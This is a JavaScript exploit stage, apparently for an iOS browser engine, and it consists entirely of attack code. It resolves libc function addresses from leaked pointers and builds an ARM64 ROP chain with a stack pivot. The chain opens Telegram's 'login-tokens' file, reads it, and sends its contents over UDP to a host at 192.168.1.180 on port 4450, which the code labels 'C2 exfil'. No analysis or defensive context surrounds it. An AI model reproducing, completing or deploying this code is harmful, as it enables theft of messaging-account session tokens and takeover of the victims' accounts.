/* ===== iOS UDP C2 exfil: login-tokens -> sendto(<LAN_IP>:4450) ===== */
  function u64(x) { return BigInt.asUintN(64, x); }
  function rd32_(A) {
    var a = A & ~7n;
    var q = u64(RD(a));
    var sh = Number(A & 7n) * 8;
    return Number((q >> BigInt(sh)) & 0xffffffffn);
  }
  function put64_(arr, off, val) {
    var v = u64(val);
    for (var i = 0; i < 8; i++) arr[off + i] = Number((v >> BigInt(i * 8)) & 0xffn);
  }
  var base = 0n;
  if (CFG.JS_DEF_FREE) {
    base = u64(js_free - BigInt(CFG.JS_DEF_FREE));
    if ((rd32_(base) >>> 0) !== 0xfeedfacf) base = 0n;
  }
  if (base === 0n) { setres('X_NO_BASE'); return; }
  var libcFree = 0n;
  if (rd32_(js_free) === 0xaa0103e0) {
    var br = rd32_(js_free + 4n);
    if (((br & 0xfc000000) >>> 0) === 0x14000000) {
      var im = br & 0x03ffffff;
      if (im & 0x02000000) im -= 0x04000000;
      var plt = js_free + 4n + BigInt(im) * 4n;
      var ad = rd32_(plt);
      if (((ad & 0x9f000000) >>> 0) === 0x90000000) {
        var ml = (ad >>> 29) & 3, mh = (ad >>> 5) & 0x7ffff;
        var ai = (mh << 2) | ml;
        if (ai & 0x100000) ai -= 0x200000;
        var pg = (plt & ~0xfffn) + BigInt(ai) * 4096n;
        var ld = rd32_(plt + 4n);
        if (((ld & 0xffc00000) >>> 0) === 0xf9400000) {
          var g2 = RD(pg + BigInt((ld >>> 10) & 0xfff) * 8n);
          if (codeok(g2)) libcFree = g2;
        }
      }
    }
  }
  if (libcFree === 0n) { setres('X_NO_FREE'); return; }
  var OPEN = u64(libcFree + 0x296b394cn);
  var READ = u64(libcFree + 0x296b2d60n);
  var SOCKET = u64(libcFree + 0x296b8d8cn);
  var SENDTO = u64(libcFree + 0x296b62fcn);
  var PEXIT = u64(libcFree + 0x4a21a474n);
  var G_CALL = base + 0x3292cn;
  var G_LOAD = base + 0x172d96cn;
  var G_X0 = base + 0x628a2cn;
  var PIVOT2 = u64(libcFree - 0x66cccfcn);

  /* leak data pointer of a fresh Uint8Array(4096) */
  var MAG = (BigInt((Math.random() * 0x100000000) >>> 0) << 32n) |
            BigInt((Math.random() * 0x100000000) >>> 0);
  if (MAG === 0n) MAG = 0x5a5a5a5a5a5a5a5an;
  var UB = new Uint8Array(4096);
  for (var i0 = 0; i0 < 4096; i0++) UB[i0] = 0;
  put64_(UB, 0x800, MAG);
  var U = 0n, lim = 0x10000n, off;
  for (off = D; off < D + lim; off += 8n) {
    var w = RD(off);
    if ((w & 0xffffffffn) === 4096n) {
      var p = RD(off + 16n);
      var pq = p & 0x00ffffffffffffffn;
      if (pq > 0x10000n && pq < 0x0001000000000000n && (p & 7n) === 0n) {
        try { if (RD(p + 0x800n) === MAG) { U = p; break; } } catch (e) {}
      }
    }
  }
  if (U === 0n) {
    for (off = D - 8n; off > D - lim; off -= 8n) {
      var w2 = RD(off);
      if ((w2 & 0xffffffffn) === 4096n) {
        var p2 = RD(off + 16n);
        var pq2 = p2 & 0x00ffffffffffffffn;
        if (pq2 > 0x10000n && pq2 < 0x0001000000000000n && (p2 & 7n) === 0n) {
          try { if (RD(p2 + 0x800n) === MAG) { U = p2; break; } } catch (e) {}
        }
      }
    }
  }
  if (U === 0n) { setres('X_NF D=' + hex(D)); return; }

  var PATH = '/var/mobile/Containers/Shared/AppGroup/00000000-0000-0000-0000-000000000000/telegram-data/accounts-metadata/login-tokens';
  function a8(x) { return (x + 7) & ~7; }
  var oPath = 0;
  var oSock = a8(oPath + PATH.length + 1);
  var oBuf = 0x200;
  var oA0 = 0x600, oB0 = 0x640, oA1 = 0x680, oA2 = 0x6C0, oB2 = 0x700, oA3 = 0x740, oB3 = 0x780;
  for (var z = 0; z < 0x808; z++) UB[z] = 0;
  for (var z2 = 0; z2 < PATH.length; z2++) UB[oPath + z2] = PATH.charCodeAt(z2) & 0xff;
  /* sockaddr_in: len=16 family=2 port=4450 (0x1162) addr=<LAN_IP> */
  UB[oSock] = 16; UB[oSock + 1] = 2;
  UB[oSock + 2] = 0x11; UB[oSock + 3] = 0x62;
  UB[oSock + 4] = 192; UB[oSock + 5] = 168; UB[oSock + 6] = 1; UB[oSock + 7] = 180;
  /* A0: open(path, 0, 0) */
  /* B0: x0 = path */
  put64_(UB, oB0 + 0x28, U + BigInt(oPath));
  /* A1: read(fd, U+oBuf, 1024) */
  put64_(UB, oA1 + 0x10, U + BigInt(oBuf));
  put64_(UB, oA1 + 0x18, 1024n);
  /* A2: socket(AF_INET, SOCK_DGRAM, 0) */
  put64_(UB, oA2 + 0x10, 2n);
  /* B2: x0 = AF_INET */
  put64_(UB, oB2 + 0x28, 2n);
  /* A3: sendto(fd, U+oBuf, 1024, 0, U+oSock, 16) */
  put64_(UB, oA3 + 0x10, U + BigInt(oBuf));
  put64_(UB, oA3 + 0x18, 1024n);
  put64_(UB, oA3 + 0x20, 0n);
  put64_(UB, oA3 + 0x28, U + BigInt(oSock));
  put64_(UB, oA3 + 0x30, 16n);

  var T = TRIG;
  if (!T || T.length < 0x500) { setres('X_TRIG'); return; }
  for (var i1 = 0; i1 < 0x500; i1++) T[i1] = 0;
  put64_(T, 0x08, U + BigInt(oB0));
  put64_(T, 0x10, G_LOAD);
  put64_(T, 0x18, U + BigInt(oA0));
  put64_(T, 0xB8, U + BigInt(oB0));
  put64_(T, 0xD0, OPEN);
  put64_(T, 0xE0, G_X0);
  put64_(T, 0xF0, G_LOAD);
  put64_(T, 0xF8, U + BigInt(oA1));
  put64_(T, 0x110, G_CALL);
  put64_(T, 0x1A0, READ);
  put64_(T, 0x1C0, G_CALL);
  put64_(T, 0x250, G_LOAD);
  put64_(T, 0x258, U + BigInt(oA2));
  put64_(T, 0x270, G_CALL);
  put64_(T, 0x2F8, U + BigInt(oB2));
  put64_(T, 0x310, SOCKET);
  put64_(T, 0x320, G_X0);
  put64_(T, 0x330, G_LOAD);
  put64_(T, 0x338, U + BigInt(oA3));
  put64_(T, 0x350, G_CALL);
  put64_(T, 0x3E0, SENDTO);
  put64_(T, 0x400, G_CALL);
  put64_(T, 0x488, U + BigInt(oB3));
  put64_(T, 0x4A0, PEXIT);
  put64_(T, 0x4B0, G_X0);

  var RT_FREE = rt + 16n, RT_USABLE = rt + 32n, RT_SIZE = rt + 48n, RT_OPAQUE = rt + 64n;
  var HUGE = 0xffffffffffffffffn, ZERO = 0n;
  setres('X_RDY ' + hex(U));
  setR(RT_FREE); Rb[0] = G_CALL;
  setR(RT_OPAQUE); Rb[0] = ZERO;
  setR(RT_SIZE); Rb[0] = HUGE;
  setR(RT_USABLE); Rb[0] = PIVOT2;
  T = null;
  try { TRIG = null; } catch (e) { setres('X_EXC'); return; }
  setres('X_AFTER');
